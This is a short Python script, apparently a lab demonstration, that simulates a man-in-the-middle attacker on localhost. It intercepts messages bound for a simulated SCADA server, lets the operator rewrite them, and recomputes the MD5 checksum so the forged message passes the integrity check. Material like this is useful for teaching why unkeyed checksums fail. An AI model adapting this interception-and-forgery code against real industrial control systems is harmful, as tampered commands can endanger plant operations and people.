import socket
import threading
import time
import random
import hashlib


# Attacker simulation (Man-in-the-middle with user interaction)
class Attacker:
    def __init__(self, target_ip='127.0.0.1', target_port=8000, proxy_port=8001):
        self.target_ip = target_ip
        self.target_port = target_port
        self.proxy_port = proxy_port

    def intercept_and_modify(self):
        # Start a proxy to intercept and modify messages
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('127.0.0.1', self.proxy_port))  # Attacker binds to a fake port (proxy)
            s.listen()
            print('Attacker proxy running...')
            while True:
                conn, addr = s.accept()
                threading.Thread(target=self._handle_interception, args=(conn,)).start()

    def _handle_interception(self, conn):
        with conn:
            data = conn.recv(1024)
            if data:
                decoded_data = data.decode('utf-8')
                modified_data = self.modify_data_with_user_input(decoded_data)
                self._forward_to_scada(modified_data)

    def modify_data_with_user_input(self, data):
        print(f"Intercepted data: {data}")
        user_input = input("Do you want to modify the message? (yes/no): ").strip().lower()

        if user_input == "yes":
            # Allow the user to modify the message
            message, checksum = data.rsplit('|', 1)
            modified_message = input(f"Enter the modified message (original: {message}): ").strip()
            new_checksum = hashlib.md5(modified_message.encode()).hexdigest()
            tampered_message_with_checksum = f'{modified_message}|{new_checksum}'
            print(f"Tampered data: {tampered_message_with_checksum}")
            return tampered_message_with_checksum
        else:
            # If no tampering, return the original message
            print(f"Forwarding original data: {data}")
            return data

    def _forward_to_scada(self, modified_data):
        # Forward the (possibly modified) data to the real SCADA server
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((self.target_ip, self.target_port))
            s.sendall(modified_data.encode('utf-8'))


# Run the simulation
if __name__ == "__main__":
    # Start Attacker in a thread
    attacker = Attacker()
    attacker_thread = threading.Thread(target=attacker.intercept_and_modify)
    attacker_thread.start()
